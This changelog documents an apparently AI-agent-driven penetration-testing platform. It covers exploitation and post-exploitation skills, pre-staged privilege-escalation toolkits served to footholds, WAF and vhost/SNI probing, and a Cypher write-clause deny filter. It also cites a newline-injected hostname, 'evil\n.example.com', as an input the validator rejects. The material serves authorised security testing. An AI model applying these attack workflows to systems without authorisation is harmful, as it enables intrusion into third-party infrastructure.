- **New module [agentic/mcp_registry.py](agentic/mcp_registry.py)** (~280 LOC): pydantic schema for `MCPServer`, `ToolSpec`, `BearerAuth`; transport-discriminated validators; cross-server uniqueness checks; `redact_for_api()` masks literal tokens before serving the manifest. Headers and stdio env values are passed through verbatim (no substitution)
- **Refactored [agentic/tools.py](agentic/tools.py)**: `MCPToolsManager(server_configs: dict)` accepts a pre-built dict instead of hardcoded URL kwargs; `SYSTEM_MCP_SERVERS` factory expresses the 5 baseline kali-sandbox servers as `MCPServer` objects; `register_mcp_tools(declared_tool_names)` filters undeclared tools while letting all `SYSTEM_MCP_TOOL_NAMES` pass through (so user MCPs can't accidentally hide built-ins)
- **`TOOL_REGISTRY` mutation under copy-on-write `RLock`** ([agentic/prompts/tool_registry.py](agentic/prompts/tool_registry.py)) — `apply_mcp_manifests_to_registry(servers)` and `remove_mcp_manifest_entries()` swap atomically; deterministic insertion order keeps the Anthropic prompt-prefix cache stable when the manifest hasn't changed
- **Read-time phase fallback** in [agentic/project_settings.py](agentic/project_settings.py) — `is_tool_allowed_in_phase` falls back to manifest defaults when a tool isn't in `TOOL_PHASE_MAP`; `get_allowed_tools_for_phase` unions both. No DB pollution from default-phase write-back
- **All four LLM-injected fields render in every phase the tool is enabled** ([agentic/prompts/__init__.py](agentic/prompts/__init__.py)) — fixed an inconsistency where `description` was previously only rendered in the informational phase. Phase toggle = enable/disable per phase, not field selection. Skill workflows (CVE_EXPLOIT_PROMPT, POST_EXPLOITATION_TOOLS_*, UNCLASSIFIED_EXPLOIT_TOOLS) now append additively on top of the descriptions instead of replacing them
- **`reload_mcp_manifests()` on the orchestrator** ([agentic/orchestrator.py](agentic/orchestrator.py)) — re-merges system + user servers, re-applies manifest to TOOL_REGISTRY, re-builds `MultiServerMCPClient`. Hash-gated trigger inside `_apply_project_settings()` so no-op re-fetches don't thrash the prompt cache
- **Three new HTTP endpoints** ([agentic/api.py](agentic/api.py)): `GET /mcp/manifest` (current registry view, redacted), `POST /mcp/reload` (idempotent re-merge), `POST /mcp/test` (throwaway client per request, 30s wall-clock, never mutates running agent state). Uses MCP `ClientSession.list_tools()` directly so the raw protocol-level `inputSchema` flows through to the UI verbatim. `BaseExceptionGroup` unwrapping surfaces real causes (401, DNS, SSL) instead of the opaque `unhandled errors in a TaskGroup`
- **`uv` installed in [agentic/Dockerfile](agentic/Dockerfile)** — for stdio Python MCPs (`uvx mcp-server-time`, `uvx mitmproxy-mcp`, `uvx semgrep-mcp`, etc.). Node was already present for `npx -y @some/mcp-package` flows


---


## [4.8.1] - 2026-05-09

### Fixed

- **Webapp build segfault on Kali / Debian 12 hosts** ([webapp/Dockerfile](webapp/Dockerfile)) -- `npm ci` crashed with `exit code: 139` (SIGSEGV) during the `prisma generate` postinstall step on `node:22-alpine`. Prisma 6.x query/schema engines link against glibc + OpenSSL 3 and intermittently segfault on Alpine's musl, even with `libc6-compat`. Switched all three build stages (deps / builder / runner) to `node:22-slim`, replaced `apk add libc6-compat` with `apt-get install openssl ca-certificates`, swapped busybox `addgroup`/`adduser` for shadow-utils `groupadd`/`useradd`, and added `wget` to the runner so `redamon.sh`'s `/api/health` probe still works. Image grows ~80-120 MB but the build is now deterministic across host kernels and Docker versions. Reported in [#103](https://github.com/samugit83/redamon/issues/103)

### Changed

- **Knowledge Base is now opt-in at install** ([redamon.sh:516-555](redamon.sh#L516-L555)) -- `./redamon.sh install` now runs lightweight by default (no GVM, no local KB, Tavily-only web search). Pass `--kbase` to enable the local Knowledge Base. The legacy `--skipkbase` flag is removed. The `.skipkbase` flag-file path and `is_skipkbase()` helper are kept internally so `update` / `up` / `up dev` are **invariant for existing installs**: pre-existing KB-on installs (no flag file) keep KB on across `update`; pre-existing KB-off installs (flag file present) keep it off
- **README + Knowledge Base wiki page** updated to document the opt-in default and the `--kbase` flag

---


## [4.8.0] - 2026-05-06

### Added — AI in Pipeline (5 hooks)

LLM-augmented decision points across the recon pipeline, each gated by the `aiInPipeline` master toggle. Every hook is a **cascade fallback** after the existing static path -- never replaces it -- and returns a deterministic safe fallback on any LLM failure, so an agent outage cannot break a scan.

- **FFuf: AI for Extensions** -- per-target HEAD probe + LLM picks the file extensions that match the detected stack (Server / X-Powered-By / X-AspNet-Version). Static `ffufExtensions` ignored when on. Per-fingerprint cache. ([recon/helpers/ai_planner/ffuf_extensions.py](recon/helpers/ai_planner/ffuf_extensions.py), `POST /llm/ffuf-extensions`). Typical impact: **30-50% fewer FFuf requests** with no recall loss
- **Nuclei: AI for Tag Selection** -- per-scan, prunes `nucleiTags` to ones matching the detected tech stack (drops `wordpress` on Node, adds `apache`/`wp-plugin` when detected). Candidate pool built live from the templates volume (~125 broad-category tags). ([recon/helpers/ai_planner/nuclei_tags.py](recon/helpers/ai_planner/nuclei_tags.py), `POST /llm/nuclei-tags`). Typical impact: **~50% fewer templates loaded**
- **WAF AI Classifier** -- second pass after `_has_cdn_markers()` static token check. Scores WAF presence 0-100 from headers + body fingerprints + cookies + latency, catching header-stripped Cloudflare / Imperva / Akamai / F5. Confidence ≥70 flips the verdict. ([recon/helpers/ai_planner/waf_classifier.py](recon/helpers/ai_planner/waf_classifier.py), `POST /llm/waf-classify`). Reduces false negatives in `check_waf_bypass`
- **Nuclei: AI Response Filter** -- second pass after the keyword-based WAF/rate-limit detection in `is_false_positive`. Only fires on suspicious status (403/406/418/429/503) + injection-class tag, so cost stays bounded. Catches rebranded WAF blocks (AWS WAF JSON, custom Imperva, Fortinet) the keyword list misses, and avoids false positives on legit pages mentioning "WAF" / "Access Denied". ([recon/helpers/ai_planner/nuclei_response_filter.py](recon/helpers/ai_planner/nuclei_response_filter.py), `POST /llm/nuclei-fp-filter`)
- **Takeover: AI Classifier** -- enrichment pass between CNAME validation and dedupe. Probes each candidate; vendor-token short-circuit (`Heroku-Request-Id`, `x-amz-bucket-region`, ...) skips the LLM when the SaaS fingerprint is genuine. Otherwise the LLM classifies the body as real unclaimed page or WAF "no-host" 404. AI-flagged collisions get `ai_waf_likely=true` and a -40 score penalty in `score_finding`, deflecting WAF false positives into `manual_review` instead of `confirmed`. ([recon/helpers/ai_planner/takeover_classifier.py](recon/helpers/ai_planner/takeover_classifier.py), `POST /llm/takeover-classify`)

### Added — UI

- **`AiToggleLabel` shared component** ([webapp/src/components/projects/ProjectForm/AiToggleLabel.tsx](webapp/src/components/projects/ProjectForm/AiToggleLabel.tsx)) -- violet Sparkles icon + label + Info-tooltip on hover. Used across Target / FFuf / Nuclei / Security Checks / Takeover sections so AI features are visually distinct
- **AI in Pipeline panel** in the Target tab -- 240px scrollable list of 5 per-tool toggles, driven by a data array (future hooks add a row, not JSX). Master `aiInPipeline` toggle cascades all 5 flags
- **Bidirectional toggle sync** -- each per-tool AI toggle in its own module section binds to the same form field as the Target panel; flipping either updates both automatically

### Added — Settings cascade

- `AI_IN_PIPELINE` master setting governs five flags: `FFUF_AI_EXTENSIONS`, `NUCLEI_AI_TAGS`, `WAF_AI_CLASSIFIER`, `NUCLEI_AI_RESPONSE_FILTER`, `TAKEOVER_AI_CLASSIFIER`. Off forces all five off (defense-in-depth against drift). [project_settings.py:apply_ai_pipeline_overrides](recon/project_settings.py)
- `AI_PIPELINE_MODEL` independently picks the model used by every hook (the recon container delegates LLM calls to the agent's `/llm/*` endpoints, so per-user provider keys live in one place)

### Fixed

- **Apex BaseURL graph orphan** ([graph_db/mixins/recon/vuln_mixin.py](graph_db/mixins/recon/vuln_mixin.py)) -- the existing orphan-cleanup pass linked Subdomain -[:HAS_BASE_URL]-> BaseURL but skipped apex URLs (`https://example.com`) because the host matched a `Domain` node, not a `Subdomain`. New apex pass attaches those to `Domain`, fixing the disconnected island that security-check findings on the apex were producing
- **Pre-existing crash on `response: null`** in [is_false_positive()](recon/helpers/nuclei_helpers.py) -- Nuclei DNS templates emit `{"response": null}` and the static path called `response.lower()` without coercion. Coerced to empty string

### Tests

- 13 new test files: validators, fingerprint stability, cascade gating, settings cascade, score penalty, multi-finding cache reuse, probe robustness, per-finding error isolation. All seven AI suites green.

---


## [4.7.1] - 2026-05-05

### Fixed

- **Empty engagement state in fireteam members** -- `FireteamMemberState` TypedDict was missing `_parent_*` fields, so LangGraph stripped parent chain memory during state merge. Added the four fields ([agentic/state.py:382-447](agentic/state.py#L382-L447))
- **Same-iteration deploy dropped freshly-analyzed step** -- when iter-N both analyzed output and deployed, the new step lived in `_completed_step` while `execution_trace` was stale. Added `_snapshot_parent_trace()` helper that merges in the missing step ([fireteam_deploy_node.py](agentic/orchestrator_helpers/nodes/fireteam_deploy_node.py))
- **All MCP tool calls failed validation from members** -- LLM emitted per-flag kwargs (`{"url":..., "depth":3}`) instead of `{"args": "..."}`. Replaced contradictory schema docs with a 4-bucket spec covering all 31 tools (Shape A: CLI args, B: command, C: typed kwargs, D: empty). Same fix in parent `plan_tools` example ([prompts/base.py:589](agentic/prompts/base.py#L589))
- **Captured artifacts truncated** -- JWTs, `.env` dumps, hashes cut at 150-600 chars in `format_chain_context`. Bumped all five render caps + member-side `exploit_success` evidence to 10000

### Added

- **Chain context propagation parent → members** -- `_build_member_state` snapshots parent's findings/failures/decisions/trace; member prompt renders `## Engagement state` (frozen at deploy) and `## Your local progress in this run` via shared `format_chain_context()`. Source attribution `(from <agent>)` at every hop
- **Self-Check section in member prompt** ([fireteam_member_think_node.py:328-352](agentic/orchestrator_helpers/nodes/fireteam_member_think_node.py#L328-L352)) -- four rules re-read each iteration: find-rate test, duplicate-target test, negative-result test, findings-emission rule
- **Cypher Recurring Lookups** ([prompts/base.py:1927-1965](agentic/prompts/base.py#L1927-L1965)) -- three schema-verified queries: asset hierarchy with CVE join, secrets via JS recon, endpoints + parameters + headers
- **Diagnostic SNAPSHOT logging** in `_build_member_state` for future debugging
- **Tests** -- 294 pass; added `test_summary_analysis_truncated_to_10000`, updated `test_evidence_truncated`

### Changed

- **Member prompt structure** -- old 200-char prose `## Your execution trace so far` removed; replaced by the two sibling sections rendered via `format_chain_context()`, matching the root agent's chain context block

---

## [4.7.0] - 2026-05-04

### Added

- **Text-file import on multi-value Project Settings fields** -- reusable [FileImportButton](webapp/src/components/projects/ProjectForm/FileImportButton.tsx) renders a small icon on 22 inputs across 10 sections (Target, Naabu, Httpx, FFuf, Gau, Nuclei, Kiterunner, SSRF, Katana, Hakrawler). Click loads a `.txt` / `.csv` (max 5MB) and writes parsed values back in each field's storage shape. Parser splits on newlines, commas, semicolons, tabs, pipes; strips BOM and `#` / `//` comments; trims and dedupes; never splits on spaces / dots / colons / slashes so headers, IPs, `host:port` and CIDR survive round-trip. Numeric fields validate `^\d+$` and surface a skipped count. 58 tests in [FileImportButton.test.tsx](webapp/src/components/projects/ProjectForm/FileImportButton.test.tsx)
- **Streaming exports for graph tables and AI Assistant Drawer** ([exportHelpers.ts](webapp/src/app/graph/utils/exportHelpers.ts)) -- new `streamCsv` / `streamJsonArray` / `streamMarkdownTable` / `streamLines` chunk rows in batches of 500 and yield to the event loop, preventing Chromium's "page unresponsive" watchdog on 50k-row exports. Output byte-identical to the non-streaming path (pinned by [exportSmoke.test.ts](webapp/src/app/graph/utils/exportSmoke.test.ts)). Migrated callers: [JsReconTable](webapp/src/app/graph/components/JsReconTable/JsReconTable.tsx), [NodeDetailsTable](webapp/src/app/graph/components/NodeDetailsTable/NodeDetailsTable.tsx), [RedZoneTableShell](webapp/src/app/graph/components/RedZoneTables/RedZoneTableShell.tsx), [useDownloadMarkdown](webapp/src/app/graph/components/AIAssistantDrawer/hooks/useDownloadMarkdown.ts)
- **CDN-edge prefilter on direct-IP recon checks** ([security_checks.py](recon/helpers/security_checks.py)) -- `check_direct_ip_http`, `check_direct_ip_https`, `check_ip_api_exposed` short-circuit when the responding host is a CDN edge, eliminating false-positive "direct IP exposure" findings on cloud-hosted targets. `run_direct_ip_checks` takes a new `cdn_ips` set to bulk-skip already-classified IPs
- **CDN / ASN hydration in partial-recon** ([graph_builders.py](recon/partial_recon_modules/graph_builders.py)) -- `_build_vuln_scan_data_from_graph` now populates `port_scan.by_ip` with `is_cdn` / `cdn` / `asn` from the `IP` node so partial-recon picks up CDN classification without re-running the port scan

### Changed

- **Webapp dev server uses Turbopack** ([webapp/package.json](webapp/package.json)) -- `npm run dev` is now `next dev --turbopack` for faster cold start and HMR. Production build unchanged

---

## [4.6.0] - 2026-05-01

### Added

- **Node Inspector** -- new default Data Table preset (first item in the dropdown, replacing All Nodes as the landing view). Per-type browser: pick one node type and every property becomes its own sortable column. Toolbar exposes type selector, columns menu (multi-toggle with Show all / Hide all), search, and XLSX / JSON / MD export of the current view. Name cells are auto-linkified for hostname/IP node types; property cells auto-link URLs / IPs / CVE / CWE / CAPEC / GitHub slugs / emails via the existing `resolveLinkable` helper
- **Persistent UI preferences** -- new `User.uiPreferences` JSON column ([webapp/prisma/schema.prisma](webapp/prisma/schema.prisma)) backed by `/api/user/preferences` (GET + PATCH). Now persisted across reloads and devices:
  - Node Inspector hidden columns -- per user, per node type
  - Bottom-bar node-type filter chips -- per user, per project
  - 2D / 3D toggle and Labels toggle -- per user, per project
  - Theme (dark / light) -- per user, global

---

## [4.5.0] - 2026-04-29

### Added

- **45 new default Chat Skills** under [agentic/skills/](agentic/skills/) (catalog now 46 with the existing `ad_kill_chain`). All ship volume-mounted, no rebuild required to pick them up:
  - **Tooling (9):** ffuf, nuclei, sqlmap, nmap, katana, httpx, naabu, subfinder, semgrep
  - **Vulnerabilities (17):** JWT Attacks, OAuth 2.0 / OIDC, Open Redirect, Information Disclosure, CSRF, Race Conditions, Business Logic Flaws, LDAP Injection, XPath Injection, Web Cache Poisoning, Prototype Pollution, CORS Misconfigurations, Host Header Injection, Clickjacking, CRLF Injection, ReDoS, 2FA OTP Bypass
  - **Protocols (4):** GraphQL Security, WebSocket Security, SOAP / WS-Security, SAML Attacks
  - **Technologies (2):** Firebase Firestore, Supabase
  - **Frameworks (3):** Next.js, FastAPI, NestJS
  - **API Security (1):** OpenAPI / Swagger Exposure
  - **Active Directory (3 new):** Kerberoasting + ASREPRoast, AD-CS ESC1-ESC15, BloodHound Path-to-DA
  - **Cloud (3):** AWS, Azure, GCP
  - **Post-Exploitation (3):** Docker Escape, Linux Privesc, Windows Privesc
- **`cve_intel` agent tool** ([agentic/prompts/tool_registry.py](agentic/prompts/tool_registry.py)) -- wraps the [vulnx](https://github.com/projectdiscovery/vulnx) CLI in `mcp/kali-sandbox/Dockerfile` for ProjectDiscovery's CVE intelligence (NVD + CISA KEV + EPSS + GitHub PoCs + Nuclei template availability). Subcommands: `id CVE-ID`, `search "lucene query"`, `filters`, `analyze --field X`, `healthcheck`. Anonymous use rate-limited to 10 req/min; set `PDCP_API_KEY` for higher limits. Use after `query_graph` (CVEs already on graph nodes) and before `execute_nuclei` (confirms a template exists). Lucene-style filters: `severity:critical`, `cvss_score:>7`, `epss_score:>0.5`, `is_kev:true`, `is_template:true`, `is_poc:true`, `vendor:apache`, `product:confluence`, `age_in_days:<30`, `tags:rce`. Always `--json --limit N`
- **Table-page row export** -- per-table **Download MD** and **Download JSON** buttons in the Tables page so any graph view (Endpoints, Subdomains, IPs, Vulnerabilities, etc.) can be exported with the current filter / sort / row selection applied; MD output is human-readable for reports, JSON output preserves typed values for piping into downstream tooling
- **Kali sandbox tooling additions** ([mcp/kali-sandbox/Dockerfile](mcp/kali-sandbox/Dockerfile)) backing the new skills:
  - `semgrep` (pip) -- source-aware SAST with rule packs `p/default`, `p/owasp-top-ten`, `p/secrets`, `p/python`, `p/javascript`, `p/typescript`, `p/golang`, `p/java`
  - `nodejs` + `npm` (apt) -- prototype-pollution gadget testing and JS exploit POCs
  - `websockets`, `zeep`, `python3-saml` (pip) -- CSWSH probes, SOAP / WS-Security, SAML XSW / Comment Injection / Golden SAML
  - `boto3`, `msal`, `azure-identity`, `azure-mgmt-resource`, `google-auth`, `google-api-python-client`, `google-cloud-storage` (pip) -- AWS / Azure / GCP API access via `execute_code` (cloud CLIs intentionally skipped; SDKs are lighter and more script-friendly)
  - Pre-staged post-exploit toolkits at `/opt/tools/{linux,windows}/` -- `linpeas.sh`, `LinEnum.sh`, `pspy64`, `deepce.sh`, `winPEASx64.exe`, `PowerUp.ps1`, `PrivescCheck.ps1`. Served to footholds via `python3 -m http.server` from the sandbox

### Changed

- **`tool_registry.py` `kali_shell` description** updated with `cve_intel`, `semgrep`, the new Python libs, Node.js, and the `/opt/tools/{linux,windows}/` toolkit paths so the agent's prompt always sees the current toolset
- **README** ([README.md:556](README.md#L556)) Chat Skills paragraph rewritten: stale "36 community-contributed skills" -> "**46 reference skills**" with full category breakdown; kali_shell row in the agent-tools table enriched with the new binaries and Python libs
- **Wiki** -- [redamon.wiki/Chat-Skills.md](redamon.wiki/Chat-Skills.md) catalog tables now list 46 skills across Active Directory / Tooling / Protocols / Technologies / Frameworks / API Security / Vulnerabilities / Cloud / Post-Exploitation; [redamon.wiki/Global-Settings.md](redamon.wiki/Global-Settings.md) "Import from Community" updated to "**46** shipped skills"; [redamon.wiki/AI-Agent-Guide.md](redamon.wiki/AI-Agent-Guide.md) `kali_shell` reference page expanded from 8 generic bullets to 13 enriched bullets covering all the new tooling

### Notes

- **Minor version bump** (4.4.0 -> 4.5.0) -- 45 new Chat Skill files (volume-mounted, no rebuild), one new agent tool wired through the registry, frontend table-export buttons, and Kali image enrichment. Required commands after pulling: `docker compose build kali-sandbox && docker compose up -d kali-sandbox` (semgrep + nodejs/npm + cloud SDK pips + 7 post-exploit toolkit fetches), `docker compose build agent && docker compose up -d agent` (registry change). Webapp rebuild for the table-export buttons in production mode (`docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d webapp` hot-reloads in dev). Verified end-to-end inside the rebuilt container: 35/35 PASS across the new tools and Python libraries (binary presence, version reporting, semgrep rule scan, node prototype-pollution gadget, npm registry, zeep WSDL Document, python3-saml Settings construction, boto3 STS endpoint, msal authority, google-cloud-storage anonymous client). All Chat Skills validated against [agentic/orchestrator_helpers/skill_loader.py](agentic/orchestrator_helpers/skill_loader.py)

---

## [4.4.0] - 2026-04-26

### Added

- **redagraph CLI** ([mcp/servers/redagraph.py](mcp/servers/redagraph.py), [graph_db/tenant_filter.py](graph_db/tenant_filter.py)) -- in-terminal tool that queries the Neo4j attack-surface graph from the kali-sandbox shell with the active `(user_id, project_id)` silently injected into every Cypher query, so manual Kali tool runs can pipe directly from the recon graph: `redagraph ls Endpoint -a baseurl > urls.txt && nuclei -l urls.txt`, `redagraph cypher 'MATCH (i:IP) RETURN i.address' | naabu -p 80,443`. Six subcommands -- `whoami`, `types`, `schema`, `ls <NodeType> [-a attr]`, `cypher '<query>'`, `ask <question...> [--show]` (NL via the agent) -- with `--format plain|json|tsv` and `-o FILE`. Three-layer tenant scoping: write-clause regex (CREATE / MERGE / DELETE / SET / REMOVE / DROP / GRANT / LOAD CSV / `apoc.create.*` / `apoc.cypher.runWrite` / `dbms.*`), inline rewrite of every labelled node pattern to add `user_id` / `project_id` props, and refusal of queries with no labelled patterns. The `agentic/tools.py` `_inject_tenant_filter` and `_find_disallowed_write_operation` are refactored to delegate to the shared `graph_db.tenant_filter` module so the agent and the CLI cannot drift apart. Tenant env (`REDAMON_USER_ID` / `REDAMON_PROJECT_ID`) reaches the shell via a new optional first WebSocket frame `{"type":"init",...}` consumed by [mcp/servers/terminal_server.py](mcp/servers/terminal_server.py) before forking bash; non-init first frames are replayed so `wscat` etc. keep working. [KaliTerminal.tsx](webapp/src/app/graph/components/KaliTerminal/KaliTerminal.tsx) sends the init frame on every `ws.onopen` and reconnects on project switch. New `/etc/profile.d/zz-redamon-motd.sh` ([mcp/kali-sandbox/redamon-motd.sh](mcp/kali-sandbox/redamon-motd.sh)) prints the example invocation and `redagraph -h` pointer after the Kali banner. Wiki: new **redagraph CLI** section in [redamon.wiki/Red-Zone.md](redamon.wiki/Red-Zone.md). Tests: 51 unit / integration cases in [tests/test_redagraph.py](tests/test_redagraph.py) covering the tenant filter, output coercion, parser, write / unlabelled guards, and the terminal-server init-frame parsing. Bug fixes uncovered along the way: (1) `{name: 'example.com'}` inside the `_generate_cypher` f-string raised `NameError` on every call -- latent regression from commit `5dd2be5` that broke the webapp graph view's text-to-cypher too, fixed by escaping the braces ([agentic/tools.py:388](agentic/tools.py#L388)); (2) `cmd_types` originally used `MATCH (n)` which the inline filter cannot scope, leaking labels across tenants -- switched to explicit `WHERE`; (3) `/text-to-cypher` now accepts `for_graph_view: bool = True` so the CLI can opt out and let the LLM return scalar properties; (4) the `KaliTerminal` reconnect-on-prop-change `useEffect` raced the mount-effect's connect, doubling banner output and killing shells mid-MOTD -- added `firstTenantRunRef` to suppress the first run
- **Tradecraft Lookup tool** ([agentic/tradecraft_lookup.py](agentic/tradecraft_lookup.py), [agentic/tradecraft_crawl.py](agentic/tradecraft_crawl.py)) -- per-user catalog of curated security knowledge URLs (HackTricks, PayloadsAllTheThings, CVE PoC repos, vendor blogs) the agent consults during exploitation. Six auto-detected resource types (`mkdocs-wiki`, `gitbook`, `github-repo`, `cve-poc-db`, `sphinx-docs`, `agentic-crawl`) each with a type-specific sitemap builder and TTL. Verify-once / query-many split: at add-time the agent fetches the homepage, detects the type, builds a sitemap, and writes a 250-350 word summary that becomes the runtime tool description; at query-time a Tier 1 HTTP / Tier 2 Playwright fetch with sqlite+disk cache returns content in an untrusted-content envelope. `cve-poc-db` is special-cased to skip the section picker and resolve `cve_id="CVE-YYYY-NNNNN"` deterministically. The `tradecraft_lookup` tool is registered conditionally and removed when zero resources are enabled. New Prisma model `UserTradecraftResource`, new webapp **Tradecraft** tab in Global Settings (Quick Add list of 51 curated presets, async verify polling, refresh / edit / delete / enable toggle), new `/tradecraft/verify` agent endpoint, 9 new project settings (`TRADECRAFT_*`), and a four-bound LLM-driven Playwright crawl loop for the fallback type. Wired into exploitation + post-exploitation phases via `agentToolPhaseMap`
- **Wiki documentation** -- [redamon.wiki/Global-Settings.md](redamon.wiki/Global-Settings.md) gains a full **Tradecraft** section (resources screen + add-resource modal, all 51 Quick Add presets grouped by type, resource-type comparison) and new dedicated [redamon.wiki/Tradecraft-Lookup.md](redamon.wiki/Tradecraft-Lookup.md) tool page (verify vs session split, sequence diagrams, section picker, two-tier fetch, cache layer, SSRF guard, comparison vs `web_search` and FAISS KB)
- **End-to-end README** ([readmes/README.TRADECRAFT.md](readmes/README.TRADECRAFT.md)) covering both phases with mermaid diagrams, lifecycle state diagram, and per-type sitemap-source table

### Notes

- **Minor version bump** (4.3.0 -> 4.4.0) -- new agent tool + new Prisma model + new agent endpoint + new webapp tab + new in-terminal CLI. No breaking changes: `TRADECRAFT_TOOL_ENABLED=true` default, but the tool registers only when the user has at least one enabled resource; `redagraph` is read-only and tenant-scoped so it cannot affect data of any other project. Required commands after pulling: `docker compose exec webapp npx prisma db push` (new `user_tradecraft_resources` table); `docker compose build agent && docker compose up -d agent` (new Tradecraft Python module + the refactored `agentic/tools.py` that imports from `graph_db.tenant_filter` + the `/text-to-cypher` brace-escape and `for_graph_view` opt-out are all COPY-baked into the agent image); `docker compose build kali-sandbox && docker compose up -d kali-sandbox` (`pip install neo4j`, the `/usr/local/bin/redagraph` symlink, the `./graph_db:/opt/graph_db:ro` volume mount, the `NEO4J_*` and `REDAMON_AGENT_URL` env vars, and the new `/etc/profile.d/zz-redamon-motd.sh` are all baked at build time); webapp rebuild only in production mode (`docker compose -f docker-compose.yml -f docker-compose.dev.yml up -d webapp` hot-reloads `KaliTerminal.tsx` in dev)

---

## [4.3.0] - 2026-04-26

### Added

- **VHost & SNI Enumeration module** ([recon/main_recon_modules/vhost_sni_enum.py](recon/main_recon_modules/vhost_sni_enum.py)) -- discovers hidden virtual hosts on every target IP by sending crafted curl requests with overridden Host headers (L7 application-layer test) and forced TLS SNI values (L4 handshake-layer test), then comparing each response against a baseline raw-IP request. Runs as a fourth parallel sibling in **GROUP 6 Phase A** alongside Nuclei, GraphQL scan, and Subdomain Takeover -- `phase_a_tools` ([recon/main.py:1375-1377](recon/main.py#L1375-L1377)) now scales to a 4-way `ThreadPoolExecutor` driven by `run_vhost_sni_enrichment_isolated()`, which deep-copies `combined_result` so the fan-out remains race-free. Disabled by default via `VHOST_SNI_ENABLED`. Zero new binaries: relies entirely on `curl` already baked into the recon image. Key components:
  - **Two-layer probing** -- L7 sets `-H "Host: <candidate>"` against `https://<ip>:<port>/` to catch classic Apache / Nginx vhosts that route on the HTTP application layer. L4 swaps the URL hostname AND uses `--resolve <candidate>:<port>:<ip>` to pin DNS so the TLS handshake carries that candidate as SNI -- this catches modern reverse proxies (NGINX ingress, Traefik, Cloudflare, k8s) that route at the TLS handshake before reading any HTTP header. L4 probes are skipped when scheme is `http` (no SNI to set). Per-request curl invocation uses `-sk -o /dev/null -w "%{http_code} %{size_download}"` with `--connect-timeout` + `--max-time = 3 * timeout`; subprocess wrapper has its own `timeout * 3 + 2` s belt-and-braces guard so a hanging curl can't stall the worker thread. Status `0` (curl couldn't connect) is dropped as no-data instead of being recorded as a real probe
  - **Anomaly detection** (`_is_anomaly`) -- a candidate hostname is flagged when its probed response differs from the baseline either in **status code** OR in body size by more than `VHOST_SNI_BASELINE_SIZE_TOLERANCE` bytes (default 50). Same-status + within-tolerance responses are silent -- no finding emitted. Per-port baseline + per-(candidate, layer) probe, all candidates fanned out via an internal `ThreadPoolExecutor(max_workers=concurrency)` so a single IP with 2,000 candidates and 20 workers completes in seconds rather than serial minutes
  - **Severity ladder** (`_classify_severity`) -- `high` when L7 and L4 disagree on the same hostname (proxy bypass primitive: requests can be authorized at one layer but routed at the other); `medium` when the discovered hidden vhost matches an internal-keyword pattern (`admin`, `jenkins`, `vault`, `keycloak`, `argocd`, `kibana`, `grafana`, ~80 entries in `INTERNAL_KEYWORDS`); `low` for any anomaly with a different status code (confirmed hidden vhost, no internal pattern); `info` for size-delta-only anomalies. Compound hostnames like `admin-portal` and `jenkins-internal` are matched via longest-keyword-wins with lexicographic tie-break for determinism across Python set iteration
  - **Three vulnerability shapes** -- `host_header_bypass` (layer = `both`, name *Routing Inconsistency (L7 vs L4)*, attached to BOTH the Subdomain AND the IP node since the IP itself is the bypass surface), `hidden_sni_route` (layer = `L4`, name *Hidden SNI-Routed Virtual Host*, attached to the Subdomain), `hidden_vhost` (layer = `L7`, name *Hidden Virtual Host*, attached to the Subdomain). Each finding carries a deterministic id `vhost_sni_<host>_<ip>_<port>_<layer>` so rescans MERGE on the same Vulnerability node in Neo4j (`first_seen` set on create, updated on every run) instead of duplicating
  - **Hostname candidate set** (`_build_candidate_set`) -- six sources merged + deduped + hostname-validated before probing: (1) **default wordlist** ([recon/wordlists/vhost-common.txt](recon/wordlists/vhost-common.txt), 2,471 entries) of common prefixes (`admin`, `staging`, `internal`, `mail`, `api`, ...) expanded with the apex domain, (2) **custom wordlist** from the `VHOST_SNI_CUSTOM_WORDLIST` setting (newline-separated, accepts both bare prefixes and full FQDNs), (3) **DNS subdomains** that resolve to the IP (`combined_result.dns.subdomains[*].ips.ipv4` + ipv6), (4) **httpx-known hosts** on the IP (`http_probe.by_host` and `http_probe.by_url`), (5) **TLS SAN list** captured per-URL by httpx (`tls_subject_alt_names`, `tls_sans`), (6) **CNAME targets** + **reverse-DNS PTR records** + **co-resident external domains** sharing the IP. `_is_valid_hostname` uses `\Z` (absolute end-of-string) instead of `$` so newline-injected hostnames (`evil\n.example.com`) cannot reach `--resolve` and corrupt curl syntax. Hostname set capped per-IP at `VHOST_SNI_MAX_CANDIDATES_PER_IP` (default 2,000) via deterministic sort + slice so identical inputs always probe the same candidates across runs
  - **IP target collection** (`_collect_ip_targets`) -- merges (no fallback / either-or) every available IP source: `port_scan.by_host` (authoritative ports + per-port scheme overrides honouring upstream knowledge that e.g. 9443 speaks https), then `dns.subdomains[*].ips.ipv4` and `dns.domain.ips.ipv4` get default 80/443 added. The merge fixes a class of bug where a partial-recon run with both a custom IP AND a graph-known IP would have probed only one set; now both are probed. Per-IP port list deduped on `(port, scheme)` preserving first occurrence
  - **Discovery feedback loop** (`_inject_into_http_probe`) -- when a finding fires and `VHOST_SNI_INJECT_DISCOVERED` is true (default), the discovered hidden vhost is folded back into `combined_result["http_probe"]["by_url"]` as a fresh BaseURL with `discovery_source="vhost_sni_enum"`, marking it `live=true`. Existing entries are not overwritten. This means downstream graph methods (and any subsequent partial-recon run) see the hidden vhost as a real target and attack it directly -- so VHost discovery feeds Nuclei / Katana / Hakrawler / Arjun / Ffuf without operator intervention
  - **Output structure** -- `combined_result.vhost_sni.{by_ip{ip: {baseline, baselines_per_port, candidates_tested, ports_tested, anomalies[], anomaly_count, is_reverse_proxy, hosts_hidden_vhosts}}, findings[], discovered_baseurls[], summary{ips_tested, candidates_total, anomalies_l7, anomalies_l4, high_severity, medium_severity, low_severity, info_severity}, scan_metadata{duration_sec, scan_timestamp, wordlist_default_used, wordlist_default_count, wordlist_custom_count, graph_candidates_used, test_l7, test_l4, size_tolerance, concurrency, timeout}}`. Effective settings dumped to stdout at run-start so the operator can audit what config the run actually used (visible in the Recon Logs Drawer)
